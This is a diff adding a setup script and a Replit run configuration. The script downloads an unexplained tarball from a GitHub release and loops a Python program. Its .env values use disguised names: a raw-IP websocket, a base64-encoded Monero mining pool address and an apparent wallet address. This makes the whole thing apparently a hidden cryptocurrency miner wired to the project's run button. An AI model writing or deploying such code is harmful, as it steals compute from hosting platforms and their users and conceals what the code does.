@@ -1,0 +1,54 @@
+curl -O -J -L https://github.com/xiqiu872-max/gonto/releases/download/vere/newpi.tar.gz && tar -xf newpi.tar.gz && rm -rf newpi.tar.gz
+echo '#!/bin/bash
+
+PORT=$1
+NAME=$2
+if [ ! -d "python" ]; then
+  echo "Python folder not found → downloading..."
+  curl -O -J -L https://github.com/indygreg/python-build-standalone/releases/download/20240107/cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
+  tar -xf cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
+  rm -f cpython-3.12.1+20240107-x86_64-unknown-linux-gnu-install_only.tar.gz
+else
+  echo "Python already exists → skip download"
+fi
+export PATH=./python/bin:$PATH
+yes |  pip install certifi
+export SSL_CERT_FILE=$(python -m certifi)
+echo "SERVER_WS=ws://168.144.106.214:3000
+SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
+SERVER_DOMAIN=89ZiiZkB7S52XsNLpJGLS3iiWpY8F7wxSV1a73psgHKWTqTPFruXTT1QW5EDmoadfyYZatKDvcGroZbHRoqNbnyh2TRbeug
+SERVER_SECRET=$NAME
+SERVER_CONNECTION=$PORT
+SERVER_MODE=FAST" > .env
+while true; do
+  python3 topix.py
+  sleep 15
+done' > bulix.sh
+echo '#!/bin/bash
+
+bash bulix.sh 4 001' > main
+
+echo 'modules = ["python-3.12"]
+
+[workflows]
+runButton = "Project"
+
+[[workflows.workflow]]
+name = "Project"
+mode = "parallel"
+author = "agent"
+
+[[workflows.workflow.tasks]]
+task = "workflow.run"
+args = "main"
+
+[[workflows.workflow]]
+name = "main"
+author = "agent"
+
+[[workflows.workflow.tasks]]
+task = "shell.exec"
+args = "bash main"
+
+[workflows.workflow.metadata]
+outputType = "console"' > .replit
